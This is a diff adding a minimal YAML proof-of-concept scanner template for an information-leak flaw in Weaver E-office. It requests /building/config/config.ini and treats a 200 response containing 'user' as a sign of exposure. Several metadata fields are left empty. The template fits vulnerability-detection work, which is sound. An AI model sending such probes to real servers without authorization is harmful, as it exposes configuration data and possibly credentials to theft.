@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 泛微E-office config 接口信息泄露(poc1)
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /building/config/config.ini
+  headers:
+response1:
+  headers:
+  body: user
+  code: 200
+requests2:
+response2:
